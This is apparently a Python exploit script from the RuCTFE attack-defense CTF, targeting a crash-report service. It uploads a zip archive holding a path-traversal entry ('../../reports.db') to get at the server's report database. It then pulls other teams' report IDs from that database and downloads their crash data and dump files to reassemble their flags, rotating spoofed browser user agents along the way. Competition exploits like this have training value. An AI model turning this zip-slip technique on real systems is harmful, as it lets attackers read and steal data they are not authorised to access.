#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: bluec0re
import requests
import string
import random
import zipfile
import io
import tempfile
import sys
import sqlite3
from functools import partial
import re
import pathlib

FLAG_RE = re.compile(r'\w{31}=')
PART_RE = re.compile(r'_(.)\(\)')

USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
               'Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0',
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
               'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.39 (KHTML, like Gecko) Version/9.0 Safari/601.1.39']


def get_uuid():
    def block():
        return ''.join(random.sample(string.ascii_lowercase + string.ascii_lowercase + string.digits, 4))
    return block() + '-' + block() + '-' + block()


class Client(requests.Session):
    def __init__(self, ip, team):
        super(Client, self).__init__()
        target = 'crash.team{}.ructfe.org'.format(team)
        print('IP', ip, 'TARGET', target)
        self.headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Host': target
        }
        self.uuid = get_uuid()
        self.target = 'http://{}'.format(ip)

    def submit(self):
        resp = self.post(self.target + '/submit', files={
            'dump_zip_file': self.build_zip()
        }, headers={
            'GUID': self.uuid,
            'Service-Name': 'submarine_internal'
        })

        print("Submit", resp.text)

    def build_zip(self):
        out = io.BytesIO()
        z = zipfile.ZipFile(out, 'w')
        z.write(str(pathlib.Path(__file__).parent / 'test.dmp'), '{}.dmp'.format(self.uuid))
        z.writestr('../../reports.db', b'')
        z.close()

        out.seek(0)
        return out

    def get_data(self):
        resp = self.get(self.target + '/{}/get'.format(self.uuid))
        z = zipfile.ZipFile(io.BytesIO(resp.content))
        dbfile = tempfile.NamedTemporaryFile()
        dbfp = z.open('../../reports.db')
        for chunk in iter(partial(dbfp.read, 1024), b''):
            dbfile.write(chunk)
        dbfile.flush()

        db = sqlite3.connect(dbfile.name)
        c = db.cursor()
        for row in c.execute("SELECT * FROM reports ORDER BY time DESC LIMIT 50"):
            guid = row[0]
            service_name = row[1]
            signature = row[3]
            time = row[2]
            if guid == self.uuid:
                continue
            print("Time", time)
            try:
                self.get_flag(guid)
            except Exception as e:
                print(str(e))
        db.close()
        dbfile.close()

    def get_flag(self, guid):
        print('Get flag for', guid)
        resp = self.get(self.target + '/{}'.format(guid))
        data = resp.json()
        parts = []
        for stack in data['crash_thread_stack']:
            part = PART_RE.search(stack['signature'])
            if part:
                part = part.group(1)
                parts.insert(0, part)
        part1 = ''.join(parts)
        print('Part 1', part1)
        resp = self.get(self.target + '/{}/get'.format(guid))
        z = zipfile.ZipFile(io.BytesIO(resp.content))
        data = z.read('{}.dmp'.format(guid))

        marker = b'HERE IS THE REST OF YOUR FLAG='
        idx = data.index(marker) + len(marker)
        flagpart = data[idx:idx+31]
        part2 = flagpart[:flagpart.find(b'=')+1].decode()
        print('Part 2', part2)
        flag = part1 + part2
        print(flag)
        sys.stdout.flush()


def main():
    ip, port, team = sys.argv[1:]
    client = Client(ip, team)
    client.submit()
    client.get_data()


if __name__ == '__main__':
    main()
